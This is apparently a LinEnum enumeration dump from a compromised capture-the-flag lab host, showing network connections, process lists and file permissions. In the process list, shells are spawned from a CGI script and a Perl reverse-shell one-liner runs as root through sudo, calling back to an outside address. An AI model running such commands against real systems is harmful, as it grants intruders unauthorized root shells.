+tcp6       0    140 10.10.10.56:80          10.10.14.62:58923       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:56893       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.131:38380      TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:39205       TIME_WAIT   -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36604      LAST_ACK    -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36596      LAST_ACK    -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36630      LAST_ACK    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.131:38376      TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:40229       TIME_WAIT   -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36620      LAST_ACK    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:55283       TIME_WAIT   -               
+tcp6       0    450 10.10.10.56:80          10.10.15.246:36666      FIN_WAIT1   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:40409       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:38355       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:46045       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:50187       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:44703       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.217:51485      FIN_WAIT2   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:39085       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:55529       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.131:38388      TIME_WAIT   -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36484      LAST_ACK    -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36494      LAST_ACK    -               
+tcp6       0      0 10.10.10.56:80          10.10.15.246:36692      SYN_RECV    -               
+tcp6       0    450 10.10.10.56:80          10.10.15.246:36658      FIN_WAIT1   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:37543       TIME_WAIT   -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36624      LAST_ACK    -               
+tcp6       0    449 10.10.10.56:80          10.10.15.246:36682      FIN_WAIT1   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:34451       TIME_WAIT   -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:50729       ESTABLISHED -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:40827       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:50535       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.15.246:36686      SYN_RECV    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:41425       TIME_WAIT   -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:58957       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:51183       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:37641       TIME_WAIT   -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:40729       ESTABLISHED -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:50351       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:44271       TIME_WAIT   -               
+tcp6       0    450 10.10.10.56:80          10.10.15.246:36652      FIN_WAIT1   -               
+tcp6       0    453 10.10.10.56:80          10.10.15.246:36650      FIN_WAIT1   -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36636      LAST_ACK    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:59201       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.217:51586      FIN_WAIT2   -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36598      LAST_ACK    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:45003       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:53671       TIME_WAIT   -               
+tcp6       0    453 10.10.10.56:80          10.10.15.246:36676      FIN_WAIT1   -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:46927       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:32915       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.15.246:36718      SYN_RECV    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.243:55864      ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:39223       TIME_WAIT   -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:54609       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:53605       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.131:38390      TIME_WAIT   -               
+
+
+[00;31mListening UDP:[00m
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+
+
+[00;33m### SERVICES #############################################[00m
+[00;31mRunning processes:[00m
+USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root          1  0.0  0.7  37764  3648 ?        Ss   13:56   0:02 /sbin/init
+root          2  0.0  0.0      0     0 ?        S    13:56   0:00 [kthreadd]
+root          3  0.1  0.0      0     0 ?        S    13:56   0:07 [ksoftirqd/0]
+root          5  0.0  0.0      0     0 ?        S<   13:56   0:00 [kworker/0:0H]
+root          7  0.1  0.0      0     0 ?        S    13:56   0:07 [rcu_sched]
+root          8  0.0  0.0      0     0 ?        S    13:56   0:00 [rcu_bh]
+root          9  0.0  0.0      0     0 ?        S    13:56   0:00 [migration/0]
+root         10  0.0  0.0      0     0 ?        S    13:56   0:00 [watchdog/0]
+root         11  0.0  0.0      0     0 ?        S    13:56   0:00 [kdevtmpfs]
+root         12  0.0  0.0      0     0 ?        S<   13:56   0:00 [netns]
+root         13  0.0  0.0      0     0 ?        S<   13:56   0:00 [perf]
+root         14  0.0  0.0      0     0 ?        S    13:56   0:00 [khungtaskd]
+root         15  0.0  0.0      0     0 ?        S<   13:56   0:00 [writeback]
+root         16  0.0  0.0      0     0 ?        SN   13:56   0:00 [ksmd]
+root         17  0.0  0.0      0     0 ?        S<   13:56   0:00 [crypto]
+root         18  0.0  0.0      0     0 ?        S<   13:56   0:00 [kintegrityd]
+root         19  0.0  0.0      0     0 ?        S<   13:56   0:00 [bioset]
+root         20  0.0  0.0      0     0 ?        S<   13:56   0:00 [kblockd]
+root         21  0.0  0.0      0     0 ?        S<   13:56   0:00 [ata_sff]
+root         22  0.0  0.0      0     0 ?        S<   13:56   0:00 [md]
+root         23  0.0  0.0      0     0 ?        S<   13:56   0:00 [devfreq_wq]
+root         27  0.3  0.0      0     0 ?        S    13:57   0:14 [kswapd0]
+root         28  0.0  0.0      0     0 ?        S<   13:57   0:00 [vmstat]
+root         29  0.0  0.0      0     0 ?        S    13:57   0:00 [fsnotify_mark]
+root         30  0.0  0.0      0     0 ?        S    13:57   0:00 [ecryptfs-kthrea]
+root         46  0.0  0.0      0     0 ?        S<   13:57   0:00 [kthrotld]
+root         47  0.0  0.0      0     0 ?        S<   13:57   0:00 [acpi_thermal_pm]
+root         48  0.0  0.0      0     0 ?        S<   13:57   0:00 [bioset]
+root         49  0.0  0.0      0     0 ?        S<   13:57   0:00 [bioset]
+root         50  0.0  0.0      0     0 ?        S<   13:57   0:00 [bioset]
+root         51  0.0  0.0      0     0 ?        S<   13:57   0:00 [bioset]
+root         52  0.0  0.0      0     0 ?        S<   13:57   0:00 [bioset]
+root         53  0.0  0.0      0     0 ?        S<   13:57   0:00 [bioset]
+root         54  0.0  0.0      0     0 ?        S<   13:57   0:00 [bioset]
+root         55  0.0  0.0      0     0 ?        S<   13:57   0:00 [bioset]
+root         56  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_0]
+root         57  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_0]
+root         58  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_1]
+root         59  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_1]
+root         65  0.0  0.0      0     0 ?        S<   13:57   0:00 [ipv6_addrconf]
+root         78  0.0  0.0      0     0 ?        S<   13:57   0:00 [deferwq]
+root         79  0.0  0.0      0     0 ?        S<   13:57   0:00 [charger_manager]
+root        126  0.0  0.0      0     0 ?        S<   13:57   0:00 [mpt_poll_0]
+root        127  0.0  0.0      0     0 ?        S<   13:57   0:00 [mpt/0]
+root        128  0.0  0.0      0     0 ?        S<   13:57   0:00 [kpsmoused]
+root        157  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_2]
+root        158  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_2]
+root        159  0.0  0.0      0     0 ?        S<   13:57   0:00 [bioset]
+root        166  0.0  0.0      0     0 ?        S<   13:57   0:00 [ttm_swap]
+root        180  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_3]
+root        181  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_3]
+root        182  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_4]
+root        183  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_4]
+root        184  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_5]
+root        185  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_5]
+root        186  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_6]
+root        187  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_6]
+root        188  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_7]
+root        189  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_7]
+root        190  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_8]
+root        191  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_8]
+root        192  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_9]
+root        193  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_9]
+root        194  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_10]
+root        195  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_10]
+root        196  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_11]
+root        197  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_11]
+root        198  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_12]
+root        199  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_12]
+root        200  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_13]
+root        201  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_13]
+root        202  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_14]
+root        203  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_14]
+root        204  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_15]
+root        205  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_15]
+root        206  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_16]
+root        207  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_16]
+root        208  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_17]
+root        209  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_17]
+root        210  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_18]
+root        211  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_18]
+root        212  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_19]
+root        213  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_19]
+root        214  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_20]
+root        215  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_20]
+root        216  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_21]
+root        217  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_21]
+root        218  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_22]
+root        219  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_22]
+root        220  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_23]
+root        221  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_23]
+root        222  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_24]
+root        223  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_24]
+root        224  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_25]
+root        225  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_25]
+root        226  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_26]
+root        227  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_26]
+root        228  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_27]
+root        229  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_27]
+root        230  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_28]
+root        231  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_28]
+root        232  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_29]
+root        233  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_29]
+root        234  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_30]
+root        235  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_30]
+root        236  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_31]
+root        237  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_31]
+root        238  0.0  0.0      0     0 ?        S    13:57   0:00 [scsi_eh_32]
+root        239  0.0  0.0      0     0 ?        S<   13:57   0:00 [scsi_tmf_32]
+root        265  0.0  0.0      0     0 ?        S    13:57   0:00 [kworker/u256:29]
+root        335  0.0  0.0      0     0 ?        S<   13:57   0:00 [raid5wq]
+root        360  0.0  0.0      0     0 ?        S<   13:57   0:00 [kdmflush]
+root        361  0.0  0.0      0     0 ?        S<   13:57   0:00 [bioset]
+root        371  0.0  0.0      0     0 ?        S<   13:57   0:00 [kdmflush]
+root        372  0.0  0.0      0     0 ?        S<   13:57   0:00 [bioset]
+root        389  0.0  0.0      0     0 ?        S<   13:57   0:00 [bioset]
+root        417  0.0  0.0      0     0 ?        S    13:57   0:00 [jbd2/dm-0-8]
+root        418  0.0  0.0      0     0 ?        S<   13:57   0:00 [ext4-rsv-conver]
+root        461  0.0  0.0      0     0 ?        S<   13:57   0:00 [kworker/0:1H]
+root        485  0.0  0.0      0     0 ?        S<   13:57   0:00 [iscsi_eh]
+root        487  0.0  0.5  27688  2720 ?        Ss   13:57   0:00 /lib/systemd/systemd-journald
+root        493  0.0  0.0      0     0 ?        S    13:57   0:00 [kauditd]
+root        494  0.0  0.0      0     0 ?        S<   13:57   0:00 [ib_addr]
+root        509  0.0  0.0      0     0 ?        S<   13:57   0:00 [ib_mcast]
+root        510  0.0  0.0      0     0 ?        S<   13:57   0:00 [ib_nl_sa_wq]
+root        511  0.0  0.0      0     0 ?        S<   13:57   0:00 [ib_cm]
+root        513  0.0  0.0      0     0 ?        S<   13:57   0:00 [iw_cm_wq]
+root        516  0.0  0.2 102968  1216 ?        Ss   13:57   0:00 /sbin/lvmetad -f
+root        519  0.0  0.0      0     0 ?        S<   13:57   0:00 [rdma_cm]
+root        541  0.0  0.6  44332  3164 ?        Ss   13:57   0:00 /lib/systemd/systemd-udevd
+root        756  0.0  0.0      0     0 ?        S    13:57   0:02 [kworker/0:4]
+root        758  0.0  0.0      0     0 ?        S<   13:57   0:00 [ext4-rsv-conver]
+systemd+    796  0.0  0.4 100324  2176 ?        Ssl  13:57   0:00 /lib/systemd/systemd-timesyncd
+root        969  0.0  0.8 185608  4204 ?        Ssl  13:57   0:03 /usr/bin/vmtoolsd
+root        972  0.0  0.2   4400  1280 ?        Ss   13:57   0:00 /usr/sbin/acpid
+root        974  0.0  0.7 275860  3508 ?        Ssl  13:57   0:00 /usr/lib/accountsservice/accounts-daemon
+daemon      977  0.0  0.4  26044  1980 ?        Ss   13:57   0:00 /usr/sbin/atd -f
+syslog      988  0.0  0.5 256396  2448 ?        Ssl  13:57   0:00 /usr/sbin/rsyslogd -n
+root        994  0.1  0.3 629932  1724 ?        Ssl  13:57   0:06 /usr/bin/lxcfs /var/lib/lxcfs/
+root        998  0.0  0.4  29008  2400 ?        Ss   13:57   0:00 /usr/sbin/cron -f
+root       1003  0.0  1.7 267556  8212 ?        Ssl  13:57   0:00 /usr/lib/snapd/snapd
+root       1007  0.0  0.5  20100  2484 ?        Ss   13:57   0:00 /lib/systemd/systemd-logind
+message+   1011  0.0  0.6  42900  3072 ?        Ss   13:57   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
+root       1042  0.0  0.7 277088  3624 ?        Ssl  13:57   0:00 /usr/lib/policykit-1/polkitd --no-debug
+root       1053  0.0  0.0  13376   148 ?        Ss   13:57   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
+root       1139  0.0  0.7  65520  3372 ?        Ss   13:57   0:00 /usr/sbin/sshd -D
+root       1145  0.0  0.0   5224   124 ?        Ss   13:57   0:00 /sbin/iscsid
+root       1146  0.0  0.7   5724  3516 ?        S<Ls 13:57   0:00 /sbin/iscsid
+root       1230  0.0  0.3  15940  1456 tty1     Ss+  13:57   0:00 /sbin/agetty --noclear tty1 linux
+root       1258  0.0  0.6  73684  3080 ?        Ss   13:57   0:00 /usr/sbin/apache2 -k start
+shelly     1260  0.0  0.4  73432  2372 ?        S    13:57   0:00 /usr/sbin/apache2 -k start
+shelly     1261  3.6  0.6 757728  2916 ?        Sl   13:57   2:21 /usr/sbin/apache2 -k start
+shelly     1262  3.6  0.6 692448  3076 ?        Sl   13:57   2:21 /usr/sbin/apache2 -k start
+root       1530  0.0  0.0      0     0 ?        S    14:05   0:00 [kworker/u256:0]
+shelly     1668  0.0  0.3   9488  1772 ?        S    14:14   0:00 /bin/bash /usr/lib/cgi-bin/user.sh
+shelly     1669  0.0  0.1   1420   632 ?        S    14:14   0:00 /tmp/UanRG
+shelly     1673  0.0  0.1   4508   516 ?        S    14:14   0:00 /bin/sh -c /bin/sh
+shelly     1674  0.0  0.1   4508   544 ?        S    14:14   0:00 /bin/sh
+shelly     1679  0.0  0.6  18952  3168 ?        S    14:15   0:00 bash -i
+shelly     1701  0.0  0.7  18952  3568 ?        S    14:16   0:00 /bin/bash -i
+shelly     1863  0.0  0.2  11284  1016 ?        S    14:32   0:00 grep --color=auto -C 5 password
+shelly     1888  0.0  0.1   4508   712 ?        S    14:34   0:00 /bin/sh -c /bin/sh
+shelly     1889  0.0  0.1   4508   564 ?        S    14:34   0:00 /bin/sh
+shelly     1890  0.0  0.7  18952  3624 ?        S    14:34   0:00 bash -i
+root       1917  0.0  0.0      0     0 ?        S    14:37   0:00 [kworker/0:1]
+shelly     1931  0.0  0.4   9488  2028 ?        S    14:38   0:00 /bin/bash /usr/lib/cgi-bin/user.sh
+shelly     1932  0.0  0.2   1216  1012 ?        Sl   14:38   0:00 /tmp/holbM
+shelly     2239  0.0  0.1   4508   712 ?        S    14:43   0:00 /bin/sh -c /bin/sh
+shelly     2240  0.0  0.1   4508   800 ?        S    14:43   0:00 /bin/sh
+shelly     2244  0.0  0.1   4508   716 ?        S    14:43   0:00 /bin/sh -c /bin/sh
+shelly     2245  0.0  0.1   4508   748 ?        S    14:43   0:00 /bin/sh
+shelly     2257  0.0  0.1   4508   756 ?        S    14:43   0:00 /bin/sh -c /bin/sh
+shelly     2258  0.0  0.1   4508   708 ?        S    14:43   0:00 /bin/sh
+shelly     2533  2.6  0.6 364448  3084 ?        Sl   14:46   0:24 /usr/sbin/apache2 -k start
+shelly     3259  0.0  0.3   9484  1868 ?        S    14:49   0:00 /bin/bash /usr/lib/cgi-bin/user.sh
+shelly     3260  0.0  0.1   1084   928 ?        Sl   14:49   0:00 /tmp/nOTFn
+shelly     3290  0.0  0.1   4508   760 ?        S    14:50   0:00 /bin/sh -c /bin/sh
+shelly     3291  0.0  0.1   4508   756 ?        S    14:50   0:00 /bin/sh
+shelly     3292  0.0  0.1   4508   756 ?        S    14:50   0:00 /bin/sh -c /bin/sh
+shelly     3293  0.0  0.1   4508   788 ?        S    14:50   0:00 /bin/sh
+shelly     3297  0.0  0.6  15956  2932 ?        S    14:53   0:00 /usr/bin/perl
+shelly     3843  0.0  0.1   4508   716 ?        S    14:55   0:00 /bin/sh -c /bin/sh
+shelly     3844  0.0  0.1   4508   708 ?        S    14:55   0:00 /bin/sh
+shelly     3857  0.0  0.8  18952  4056 ?        S    14:55   0:00 bash -i
+root       3867  0.0  0.7  49792  3448 ?        S    14:55   0:00 sudo /usr/bin/perl
+root       3868  0.0  0.6  15956  3344 ?        S    14:55   0:00 /usr/bin/perl
+shelly     3870  0.0  0.1   4508   716 ?        S    14:55   0:00 /bin/sh -c /bin/sh
+shelly     3871  0.0  0.1   4508   760 ?        S    14:55   0:00 /bin/sh
+shelly     3872  0.0  0.8  18952  3888 ?        S    14:55   0:00 bash -i
+root       3882  0.0  0.7  49792  3504 ?        S    14:56   0:00 sudo /usr/bin/perl
+root       3883  0.0  0.6  15956  3324 ?        S    14:56   0:00 /usr/bin/perl
+shelly     3884  0.0  0.1   9480   892 ?        S    14:57   0:00 /bin/bash /usr/lib/cgi-bin/user.sh
+shelly     3885  0.0  0.8  18944  3988 ?        S    14:57   0:00 /bin/bash -i
+shelly     3898  0.0  0.1   4508   716 ?        S    14:57   0:00 /bin/sh -c /bin/sh
+shelly     3899  0.0  0.1   4508   720 ?        S    14:57   0:00 /bin/sh
+shelly     3900  0.0  0.8  18952  3984 ?        S    14:57   0:00 bash -i
+shelly     3922  0.0  0.6  15956  3320 ?        S    14:58   0:00 perl
+shelly     3923  0.0  0.1   4508   764 ?        S    14:58   0:00 /bin/sh -c /bin/sh
+shelly     3924  0.0  0.1   4508   768 ?        S    14:58   0:00 /bin/sh
+shelly     4428  0.0  0.1   4508   856 ?        S    15:00   0:00 /bin/sh -c /bin/sh
+shelly     4429  0.0  0.3   4508  1492 ?        S    15:00   0:00 /bin/sh
+shelly     4437  0.0  0.1   9476   916 ?        S    15:00   0:00 /bin/bash /usr/lib/cgi-bin/user.sh
+shelly     4438  0.0  0.4   9484  2048 ?        S    15:00   0:00 /bin/bash /usr/lib/cgi-bin/user.sh
+shelly     4439  0.0  0.1   4508   672 ?        S    15:00   0:00 //bin/sh
+root       4948  0.0  0.7  49792  3444 ?        S    15:00   0:00 sudo perl -e use Socket;$i="10.10.15.218";$p=444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
+root       4949  0.0  0.1   4508   712 ?        S    15:00   0:00 /bin/sh -i
+shelly     4966  1.0  0.6  18156  2904 ?        S    15:01   0:00 /bin/bash ./LinEnum.sh
+shelly     5261  0.0  0.4  18156  1988 ?        S    15:01   0:00 /bin/bash ./LinEnum.sh
+shelly     5262  0.0  0.5  34424  2844 ?        R    15:01   0:00 ps aux
+
+
+[00;31mProcess binaries & associated permissions (from above list):[00m
+lrwxrwxrwx 1 root   root          4 Sep 22 12:28 //bin/sh -> dash
+-rwxr-xr-x 1 root   root     955024 Apr  3  2012 /bin/bash
+lrwxrwxrwx 1 root   root          4 Sep 22 12:28 /bin/sh -> dash
+-rwxr-xr-x 1 root   root     326224 Jul 18 19:56 /lib/systemd/systemd-journald
+-rwxr-xr-x 1 root   root     618520 Jul 18 19:56 /lib/systemd/systemd-logind
+-rwxr-xr-x 1 root   root     141904 Jul 18 19:56 /lib/systemd/systemd-timesyncd
+-rwxr-xr-x 1 root   root     453240 Jul 18 19:57 /lib/systemd/systemd-udevd
+-rwxr-xr-x 1 root   root      44104 Jun 14  2017 /sbin/agetty
+lrwxrwxrwx 1 root   root         20 Jul 18 19:56 /sbin/init -> /lib/systemd/systemd
+-rwxr-xr-x 1 root   root     783984 Jul 26 11:15 /sbin/iscsid
+-rwxr-xr-x 1 root   root      51336 Apr 16  2016 /sbin/lvmetad
+-rwxr-xr-x 1 root   root     513216 Feb 20  2017 /sbin/mdadm
+-rwxrwxrwx 1 shelly shelly      207 Dec 23 14:14 /tmp/UanRG
+-rwxrwxrwx 1 shelly shelly      207 Dec 23 14:38 /tmp/holbM
+-rwxrwxrwx 1 shelly shelly      207 Dec 23 14:49 /tmp/nOTFn
+-rwxr-xr-x 1 root   root     224208 Jan 12  2017 /usr/bin/dbus-daemon
+-rwxr-xr-x 1 root   root      18504 Jul  5 18:24 /usr/bin/lxcfs
+-rwxr-xr-x 2 root   root    1907192 Mar 13  2016 /usr/bin/perl
+-rwxr-xr-x 1 root   root      44528 Feb  9  2017 /usr/bin/vmtoolsd
+-rwxr-xr-x 1 root   root     164928 Nov  3  2016 /usr/lib/accountsservice/accounts-daemon
+-rwxr-xr-x 1 root   root      15048 Jan 17  2016 /usr/lib/policykit-1/polkitd
+-rwxr-xr-x 1 root   root   20031344 Aug 31 06:17 /usr/lib/snapd/snapd
+-rwxr-xr-x 1 root   root      48112 Apr  8  2016 /usr/sbin/acpid
+-rwxr-xr-x 1 root   root     662496 Sep 18 12:39 /usr/sbin/apache2
+-rwxr-xr-x 1 root   root      26632 Jan 14  2016 /usr/sbin/atd
+-rwxr-xr-x 1 root   root      44472 Apr  5  2016 /usr/sbin/cron
+-rwxr-xr-x 1 root   root     599328 Apr  5  2016 /usr/sbin/rsyslogd
+-rwxr-xr-x 1 root   root     799216 Mar 16  2017 /usr/sbin/sshd
+
+
+[00;31m/etc/init.d/ binary permissions:[00m
+total 316
+drwxr-xr-x  2 root root 4096 Sep 22 14:11 .
+drwxr-xr-x 90 root root 4096 Sep 22 15:55 ..
+-rw-r--r--  1 root root 1183 Sep 22 14:11 .depend.boot
+-rw-r--r--  1 root root 1020 Sep 22 14:11 .depend.start
+-rw-r--r--  1 root root 1167 Sep 22 14:11 .depend.stop
+-rw-r--r--  1 root root 2427 Jan 19  2016 README
+-rwxr-xr-x  1 root root 2243 Feb  9  2016 acpid
+-rwxr-xr-x  1 root root 2210 Apr  5  2016 apache-htcacheclean
+-rwxr-xr-x  1 root root 8087 Apr  5  2016 apache2
+-rwxr-xr-x  1 root root 6223 Mar  3  2017 apparmor
+-rwxr-xr-x  1 root root 2799 Mar 31  2016 apport
+-rwxr-xr-x  1 root root 1071 Dec  6  2015 atd
+-rwxr-xr-x  1 root root 1275 Jan 19  2016 bootmisc.sh
+-rwxr-xr-x  1 root root 3807 Jan 19  2016 checkfs.sh
+-rwxr-xr-x  1 root root 1098 Jan 19  2016 checkroot-bootclean.sh
+-rwxr-xr-x  1 root root 9353 Jan 19  2016 checkroot.sh
+-rwxr-xr-x  1 root root 1343 Apr  4  2016 console-setup
+-rwxr-xr-x  1 root root 3049 Apr  5  2016 cron
+-rwxr-xr-x  1 root root  937 Mar 28  2015 cryptdisks
+-rwxr-xr-x  1 root root  896 Mar 28  2015 cryptdisks-early
+-rwxr-xr-x  1 root root 2813 Dec  1  2015 dbus
+-rwxr-xr-x  1 root root 1105 Mar 15  2016 grub-common
+-rwxr-xr-x  1 root root 1336 Jan 19  2016 halt
+-rwxr-xr-x  1 root root 1423 Jan 19  2016 hostname.sh
+-rwxr-xr-x  1 root root 3809 Mar 12  2016 hwclock.sh
+-rwxr-xr-x  1 root root 2372 Apr 11  2016 irqbalance
+-rwxr-xr-x  1 root root 1503 Mar 29  2016 iscsid
+-rwxr-xr-x  1 root root 1804 Apr  4  2016 keyboard-setup.dpkg-bak
+-rwxr-xr-x  1 root root 1300 Jan 19  2016 killprocs
+-rwxr-xr-x  1 root root 2087 Dec 20  2015 kmod
+-rwxr-xr-x  1 root root  695 Oct 30  2015 lvm2
+-rwxr-xr-x  1 root root  571 Oct 30  2015 lvm2-lvmetad
+-rwxr-xr-x  1 root root  586 Oct 30  2015 lvm2-lvmpolld
+-rwxr-xr-x  1 root root 2300 Jun 29  2016 lxcfs
+-rwxr-xr-x  1 root root 2541 Jun 30  2016 lxd
+-rwxr-xr-x  1 root root 2611 Apr 11  2016 mdadm
+-rwxr-xr-x  1 root root 1199 Jul 16  2014 mdadm-waitidle
+-rwxr-xr-x  1 root root  703 Jan 19  2016 mountall-bootclean.sh
+-rwxr-xr-x  1 root root 2301 Jan 19  2016 mountall.sh
+-rwxr-xr-x  1 root root 1461 Jan 19  2016 mountdevsubfs.sh
+-rwxr-xr-x  1 root root 1564 Jan 19  2016 mountkernfs.sh
+-rwxr-xr-x  1 root root  711 Jan 19  2016 mountnfs-bootclean.sh
+-rwxr-xr-x  1 root root 2456 Jan 19  2016 mountnfs.sh
+-rwxr-xr-x  1 root root 4771 Jul 19  2015 networking
+-rwxr-xr-x  1 root root 1581 Oct 15  2015 ondemand
+-rwxr-xr-x  1 root root 2503 Mar 29  2016 open-iscsi
+-rwxr-xr-x  1 root root 1578 Mar 29  2016 open-vm-tools
+-rwxr-xr-x  1 root root 1366 Nov 15  2015 plymouth
+-rwxr-xr-x  1 root root  752 Nov 15  2015 plymouth-log
+-rwxr-xr-x  1 root root 1192 Sep  6  2015 procps
+-rwxr-xr-x  1 root root 6366 Jan 19  2016 rc
+-rwxr-xr-x  1 root root  820 Jan 19  2016 rc.local
+-rwxr-xr-x  1 root root  117 Jan 19  2016 rcS
